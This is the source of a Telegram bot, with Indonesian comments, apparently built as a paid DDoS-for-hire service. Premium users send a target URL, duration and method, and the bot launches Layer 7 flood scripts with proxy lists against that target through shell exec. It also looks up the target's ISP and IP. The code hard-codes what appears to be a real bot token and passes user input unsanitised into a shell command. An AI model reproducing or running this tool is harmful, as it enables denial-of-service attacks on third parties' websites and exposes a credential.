const { Telegraf } = require('telegraf');
const path = require('path');
const axios = require('axios');
const { exec } = require('child_process');
const fs = require('fs');
const url = require('url');

const bot = new Telegraf('7287508845:AAHbtYXgUYyDLBB7meaYaPfjJVgG7bVD4TY'); // Ganti dengan token bot Anda

const adminId = 5987477751; // ID admin
const premiumUserDB = './premiumUsers.json';
const blacklistedDomains = ['google.com', 'tesla.com', 'fbi.gov', 'youtube.com', 'lahelu.com'];

let premiumUsers = [];

// Fungsi untuk memuat pengguna premium dari file
function loadPremiumUsers() {
  if (fs.existsSync(premiumUserDB)) {
    const fileContent = fs.readFileSync(premiumUserDB);
    if (fileContent.length > 0) {
      premiumUsers = JSON.parse(fileContent);
    }
  }
}

// Fungsi untuk menyimpan pengguna premium ke file
function savePremiumUsers() {
  fs.writeFileSync(premiumUserDB, JSON.stringify(premiumUsers, null, 2));
}

// Muat pengguna premium saat aplikasi dimulai
loadPremiumUsers();

// Fungsi untuk memeriksa apakah pengguna adalah admin
function isAdmin(userId) {
  return userId === adminId;
}

// Fungsi untuk memeriksa apakah pengguna adalah pengguna premium
function isPremiumUser(userId) {
  return premiumUsers.includes(userId);
}

// Fungsi untuk menambahkan pengguna premium
function addPremiumUser(userId) {
  if (!premiumUsers.includes(userId)) {
    premiumUsers.push(userId);
    savePremiumUsers();
  }
}

// Fungsi untuk menghapus pengguna premium
function removePremiumUser(userId) {
  const index = premiumUsers.indexOf(userId);
  if (index > -1) {
    premiumUsers.splice(index, 1);
    savePremiumUsers();
  }
}

bot.start((ctx) => {
  ctx.reply('Selamat datang! Gunakan perintah /ddos <url> <duration> <methods> untuk memulai.');
});

bot.command('addprem', (ctx) => {
  const args = ctx.message.text.split(' ').slice(1);
  if (args.length !== 1) return ctx.reply('Format yang benar adalah: /addprem <user_id>');

  const userId = args[0];
  if (isAdmin(ctx.from.id)) {
    addPremiumUser(userId);
    ctx.reply(`User ${userId} telah ditambahkan sebagai pengguna premium.`);
  } else {
    ctx.reply('Hanya admin yang dapat menambahkan pengguna premium.');
  }
});

bot.command('delprem', (ctx) => {
  const args = ctx.message.text.split(' ').slice(1);
  if (args.length !== 1) return ctx.reply('Format yang benar adalah: /delprem <user_id>');

  const userId = args[0];
  if (isAdmin(ctx.from.id)) {
    removePremiumUser(userId);
    ctx.reply(`User ${userId} telah dihapus dari pengguna premium.`);
  } else {
    ctx.reply('Hanya admin yang dapat menghapus pengguna premium.');
  }
});

bot.command('premium', (ctx) => {
  const userId = String(ctx.from.id);
  if (isPremiumUser(userId)) {
    ctx.reply('Anda adalah pengguna premium.');
  } else {
    ctx.reply('Anda bukan pengguna premium.');
  }
});

bot.command('methods', (ctx) => {
  const methodsList = `
Berikut adalah metode Layer 7 yang tersedia:
- tls
- strike
- flood
  `;
  ctx.reply(methodsList);
});

bot.command('ddos', async (ctx) => {
  const userId = String(ctx.from.id);
  if (!isPremiumUser(userId)) {
    return ctx.reply('Anda bukan pengguna premium. Silakan minta admin untuk menambahkan Anda sebagai pengguna premium.');
  }

  const args = ctx.message.text.split(' ').slice(1);
  if (args.length < 3) return ctx.reply('Format yang benar adalah: /ddos <url> <duration> <methods>');

  if (blacklistedDomains.some(domain => args[0].includes(domain))) {
    return ctx.reply('âŒ Blacklisted Target.');
  }

  const target = args[0];
  const duration = parseInt(args[1], 10);
  const methods = args[2];
  const parsedUrl = new url.URL(target);
  const hostname = parsedUrl.hostname;
  const path = parsedUrl.pathname;

  try {
    const response = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
    const result = response.data;

    const initialMessage = await ctx.reply(`Memulai serangan ke ${target} dengan metode ${methods} selama ${duration} detik.`);

    const attackMethods = {
      tls: `node ./lib/mt/Tls.js ${target} ${duration} 100 10`,
      strike: `node ./lib/mt/strike.js GET ${target} ${duration} 10 100 proxy.txt`,
      flood: `node ./lib/mt/floodsX.js ${target} ${duration} 10 100 proxy.txt`,
    };

    if (attackMethods[methods]) {
      exec(attackMethods[methods]);
    } else {
      return ctx.reply('Unknown Methods');
    }

    const details = `│ Owner: BIMZ
│ Target: ${target}
│ Methods: ${methods}
│ Duration: ${duration}
\`Hostname: ${hostname}\`
\`Path: ${path}\`
\`Isp: ${result.isp}\`
\`Ip: ${result.query}\`
\`AS: ${result.as}\``;

    ctx.reply(`Serangan ke ${target} telah selesai.\n${details}`);
  } catch (error) {
    ctx.reply('Terjadi kesalahan dalam memulai serangan.');
  }
});

bot.launch();
